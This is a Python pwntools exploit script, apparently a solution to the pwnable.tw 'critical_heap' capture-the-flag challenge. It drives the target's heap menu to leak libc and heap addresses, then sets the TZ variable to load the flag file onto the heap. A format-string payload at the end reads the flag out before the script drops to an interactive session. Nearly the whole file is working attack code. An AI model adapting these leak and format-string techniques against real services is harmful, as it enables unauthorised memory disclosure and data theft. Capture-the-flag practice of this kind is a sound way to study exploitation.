#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./critical_heap"
libc="/lib/x86_64-linux-gnu/libc.so.6"
elf=ELF(pwn_file)
libc_address=0
heap_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chall.pwnable.tw",10500)
    pid=0

def debug():
    log.info("heap address: 0x%x"%heap_address)
    log.info("libc address: 0x%x"%libc_address)
    log.debug("process pid:%d"%pid)
    pause()

def create_heap(name,heap_type,content=None):
    # heap_type 
    # 1. Normal
    # 2. Clock
    # 3. System
    conn.sendlineafter("Your choice : ","1")
    conn.sendafter("Name of heap:",name)
    conn.sendlineafter("Your choice : ",str(heap_type))
    if heap_type !=1:
        return
    else:
        conn.sendafter("Content of heap :",content)

def show_heap(index):
    # only for normal heap
    conn.sendlineafter("Your choice : ","2")
    conn.sendlineafter("Index of heap :",str(index))
    name=conn.recvline()[len("Name : "):-1]
    content=conn.recvline()[len("Content : "):-1]
    return name,content

def change_content(index,content):
    # only for normal heap
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","2")
    conn.sendafter("Content :",content)
    conn.sendlineafter("Your choice : ","3")

def set_env(index,name,value):
    conn.sendafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","1")
    conn.sendlineafter("Give me a name for the system heap :",name)
    conn.sendlineafter("Give me a value for this name :",value)
    conn.sendlineafter("Your choice : ","5")

# leak libc address
create_heap("a"*8,1,"b"*0x28) # 0
name,content=show_heap(0)
libc_address=u64(name[8:14]+"\x00\x00")-0xf72c0

# leak heap address
create_heap("a"*0x8,1,"b"*0x28)# 1
create_heap("a"*0x8,1,"b"*0x28)# 2
change_content(1,"b"*0x28)
name,content=show_heap(1)
heap_address=u64(content[0x30:].ljust(8,"\x00"))-0x50

# read flag to heap
create_heap("a",3)# 3
set_env(3,"TZ","/home/critical_heap++/flag")
#set_env(3,"TZ","/home/hzshang/flaggggggggg")
create_heap("a",2)# 4
conn.sendlineafter("Your choice : ","4")
conn.sendlineafter("Index of heap :","0")
payload="%x"*12+"%s".ljust(8)+p64(heap_address+0x480)
conn.sendlineafter("Your choice : ","2")
conn.sendafter("Content :",payload)
conn.sendlineafter("Your choice : ","1")
debug()
conn.interactive()

